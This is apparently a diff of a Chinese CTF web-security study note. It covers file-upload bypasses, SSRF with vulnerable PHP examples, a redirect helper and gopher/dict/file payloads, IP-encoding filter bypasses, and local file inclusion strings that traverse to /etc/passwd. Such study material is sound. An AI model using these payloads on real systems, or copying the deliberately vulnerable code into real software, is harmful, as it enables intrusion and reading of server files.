@@ -666,14 +666,56 @@ mysql数据库仅有的
 
 ​		文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。**显然这种漏洞是getshell最快最直接的方法之一**，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。
 
-##### 文件上传常见验证
+### 文件上传常见验证
 
 + 后缀名：类型、文件头等
 + 后缀名：黑名单、白名单
 + 文件类型：MIME信息
 + 文件头：内容头信息
 
+### 绕过上传检查
 
++ 前端检查扩展名
+
+  抓包绕过即可
+
++ Content-Type检测文件类型
+
+  抓包修改Content-Type类型，使其符合白名单规则
+
++ 服务端添加后缀
+
+  尝试%00截断
+
++ 服务端扩展名检测
+
+  利用解析漏洞
+
++ Apache解析
+
+  Apache对后缀解析都是从右向左的。`phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。
+
++ IIS解析
+
+  IIS 6下当文件名为abc.asp;xx.jpg时，会将其解析为abc.asp
+
++ PHP CGI路径解析
+
+  当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析， `notexist.php` 是不存在的文件。此时 Nginx 的配置如下
+
+  ~~~xml
+  location ~ \.php$ {
+    root html;
+    fastcgi_pass 127.0.0.1:9000;
+    fastcgi_index index.php;
+    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
+    include fastcgi_param;
+  }
+  ~~~
+
++ 其他方式
+
++ 后缀大小写、双写、特殊后缀如php5等，修改包内容的大小写绕过WAF等。
 
 ## XSS跨站脚本攻击
 
@@ -847,6 +889,221 @@ Token还应注意其保密性，如果Token出现在url中，则可能会通过R
 
 ## SSRF
 
+SSRF（Server-Side Request Forgery：服务端请求伪造）是一种由攻击者构造形成的由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
+
+漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。
+
+攻击者可以利用SSRF实现的攻击主要有5种：
+
+1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息
+2. 攻击运行在内网或者本地的应用程序（比如溢出）
+3. 对内网WEB应用进行指纹识别，通过访问默认文件实现
+4. 攻击内外网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2、sqli等)
+5. 利用`file`协议读取本地文件等
+
+### SSRF漏洞出现的场景
+
++ 能够对外发起网络请求的地方，就有可能存在SSRF漏洞
++ 从远程服务器请求资源（Upload from URL，Import & Export RSS Feed）
++ 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）
++ Webmail收取其他邮箱邮件（POP3、IMAP、SMTP）
++ 文件处理、编码处理、属性信息处理ffmpeg、ImageMagic、DOCX、PDF、XML）
+
+### 常用的后端实现
+
+**1. file_get_contents**
+
+~~~php
+<?php
+if (isset($_POST['url'])) { 
+    $content = file_get_contents($_POST['url']); 
+    $filename ='./images/'.rand().';img1.jpg'; 
+    file_put_contents($filename, $content); 
+    echo $_POST['url']; 
+    $img = "<img src=\"".$filename."\"/>"; 
+}
+echo $img;
+?>
+~~~
+
+这段代码使用 `file_get_contents` 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。
+
+**2. fsockopen()**
+
+~~~php
+<?php 
+function GetFile($host,$port,$link) { 
+    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
+    if (!$fp) { 
+        echo "$errstr (error number $errno) \n"; 
+    } else { 
+        $out = "GET $link HTTP/1.1\r\n"; 
+        $out .= "Host: $host\r\n"; 
+        $out .= "Connection: Close\r\n\r\n"; 
+        $out .= "\r\n"; 
+        fwrite($fp, $out); 
+        $contents=''; 
+        while (!feof($fp)) { 
+            $contents.= fgets($fp, 1024); 
+        } 
+        fclose($fp); 
+        return $contents; 
+    } 
+}
+?>
+~~~
+
+这段代码使用 `fsockopen` 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。
+
+**3. curl_exec()**
+
+~~~php
+<?php 
+if (isset($_POST['url'])) {
+    $link = $_POST['url'];
+    $curlobj = curl_init();
+    curl_setopt($curlobj, CURLOPT_POST, 0);
+    curl_setopt($curlobj,CURLOPT_URL,$link);
+    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
+    $result=curl_exec($curlobj);
+    curl_close($curlobj);
+
+    $filename = './curled/'.rand().'.txt';
+    file_put_contents($filename, $result); 
+    echo $result;
+}
+?>
+~~~
+
+使用 `curl` 获取数据。
+
+### 阻碍SSRF漏洞利用的场景
+
++ 服务器开启OpenSSL无法进行交互利用
++ 服务端需要鉴权（Cookies & User:Pass）不能完美利用
++ 限制请求的端口为http常用的端口，如80、443、8080等
++ 禁用不需要的协议。仅仅允许http和https请求。可以防止类似于`file:///、gopher://、ftp://`等引起的问题。
++ 同一错误信息，避免用户可以错误信息来判断远端服务器的端口状态
+
+### 利用SSRF进行端口扫描
+
+根据服务器的返回信息进行判断，大部分应用不会判别端口，可通过返回的 banner 信息判断端口状态。
+
+后端实现
+
+~~~php
+<?php 
+if (isset($_POST['url'])) {
+    $link = $_POST['url'];
+    $filename = './curled/'.rand().'txt';
+    $curlobj = curl_init($link);
+    $fp = fopen($filename,"w");
+    curl_setopt($curlobj, CURLOPT_FILE, $fp);
+    curl_setopt($curlobj, CURLOPT_HEADER, 0);
+    curl_exec($curlobj);
+    curl_close($curlobj);
+    fclose($fp);
+    $fp = fopen($filename,"r");
+    $result = fread($fp, filesize($filename)); 
+    fclose($fp);
+    echo $result;
+}
+?>
+~~~
+
+构造一个前端页面
+
+~~~html
+<html>
+<body>
+  <form name="px" method="post" action="http://127.0.0.1/ss.php">
+    <input type="text" name="url" value="">
+    <input type="submit" name="commit" value="submit">
+  </form>
+  <script></script>
+</body>
+</html>
+~~~
+
+请求非 HTTP 的端口可以返回 banner 信息。
+
+或可利用 302 跳转绕过 HTTP 协议的限制。
+
+辅助脚本
+
+~~~php
+<?php
+$ip = $_GET['ip'];
+$port = $_GET['port'];
+$scheme = $_GET['s'];
+$data = $_GET['data'];
+header("Location: $scheme://$ip:$port/$data");
+?>
+~~~
+
+### 协议利用
+
+- Dict 协议
+
+  ```
+  dict://fuzz.wuyun.org:8080/helo:dict
+  ```
+
+- Gopher 协议
+
+  ```
+  gopher://fuzz.wuyun.org:8080/gopher
+  ```
+
+- File 协议
+
+  ```
+  file:///etc/passwd
+  ```
+
+### 绕过姿势 
+
+1. 更改 IP 地址写法 例如`192.168.0.1`
+
+   - 8 进制格式：`0300.0250.0.1`
+   - 16 进制格式：`0xC0.0xA8.0.1`
+   - 10 进制整数格式：`3232235521`
+   - 16 进制整数格式：`0xC0A80001`
+   - 还有一种特殊的省略模式，例如`10.0.0.1`这个 IP 可以写成`10.1`
+
+2. 利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如：
+
+   - `http://www.baidu.com@192.168.0.1/`与`http://192.168.0.1`请求的都是`192.168.0.1`的内容
+
+   - 可以指向任意 ip 的域名`xip.io`：`http://127.0.0.1.xip.io/`==>`http://127.0.0.1/`
+
+   - 短地址`http://dwz.cn/11SMa`==>`http://127.0.0.1`
+
+   - 利用句号`。`：`127。0。0。1`==>`127.0.0.1`
+
+   - 利用 Enclosed alphanumerics
+
+     ```
+     ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
+     List:
+     ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
+     ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
+     ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
+     ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
+     Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
+     ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
+     ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
+     ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+     ```
+
+### 危害
+
++ 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息
++ 攻击运行在内网或者本地的应用程序（比如溢出）
++ 对内网WEB应用进行指纹识别，通过访问默认文件实现
++ 攻击内外网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2、sqli等)
++ 利用`file`协议读取本地文件等
+
 ### Gopher协议在SSRF漏洞中的研究
 
 > 1. 什么是Gopher协议？
@@ -857,7 +1114,7 @@ Token还应注意其保密性，如果Token出现在url中，则可能会通过R
 
 
 
-#### 什么是gopher协议？
+**什么是**gopher协议？
 
 **定义**：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便的将用户从Internet的一处带到另一处。在www出现之前，Gopher是Internet上主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。
 
@@ -1020,3 +1277,108 @@ curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:
 
 
 
+## 越权
+
+越权漏洞是 WEB 应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。
+
+## 反序列化之PHP&JAVA全解
+
+![PHP反序列化.png](CTF-WEB%E7%AF%87.assets/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png)
+
+原理：
+
+
+
+~~~
+#序列化与反序列化
+序列化（Serializatioin）：将对象的状态信息转换为可以存储或者传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或者持久型存储区。
+反序列化：从存储区读取改数据，并将其还原为对象的过程，成为反序列化。
+~~~
+
+
+
+![JAVA反序列化.png](CTF-WEB%E7%AF%87.assets/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png)
+
+ 
+
+## PHP代码审计
+
+### 文件包含
+
+常见的导致文件包含的函数有：
+
++ PHP：`include()` 、`include_once()` 、`require()` 、`require_once()` 、`fopen()` 、`readfile()`等
++ JSP Servlet：`ava.io.File()` 、`java.io.FileReader()`等
++ ASP：`includefile` 、`includevirtual`等
+
+当php包含一个文件时，会将该文件当做PHP代码执行，而不会在意文件是什么类型。
+
+#### 本地文件包含
+
+本地文件包含，Local File Inclusion ,LFI.
+
+~~~php
+<?php
+$file = $_GET['file'];
+if (file_exists('/home/wwwrun/'.$file.'.php')) {
+  include '/home/wwwrun/'.$file.'.php';
+}
+?>
+~~~
+
+上述代码存在本地文件包含，可用%00截断的方式读取/etc/paseds中的文件内容
+
++ %00截断
+
+  ~~~
+  ?file=../../../../../../../../../etc/passed%00
+  ~~~
+
+  需要 `magic_quotes_gpc=off`,php版本小于5.3.4有效。
+
++ 路径长度截断
+
+  ~~~
+  ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
+  ~~~
+  
+  Linux 需要文件名长于 4096，Windows 需要长于 256。
+  
++ 点号截断
+
+  ~~~
+  ?file=../../../../../../../../../boot.ini/………[…]…………
+  ~~~
+
+  只适用Windows，点号需要长于256。
+
+#### 远程文件包含
+
+远程文件包含，Remote File Inclusion,RFI
+
+~~~php
+<?php
+if ($route == "share") {
+  require_once $basePath . "/action/m_share.php";
+} elseif ($route == "sharelink") {
+  require_once $basePath . "/action/m_sharelink.php";
+}
+~~~
+
+
+
+
+
+
+
+
+
+
+
+## IDS
+
+IDS是英文Intrusion Detection Systems的缩写，中文意思是[入侵检测系统]。从专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行情况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。做一个形象的比喻：假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。
+
+## IPS
+
+入侵防御系统（IPS：Intrusion Prevention System）是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙（Packet Filter，Application Gateway）的补充。入侵防御系统是一部能够监视网络或者网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。
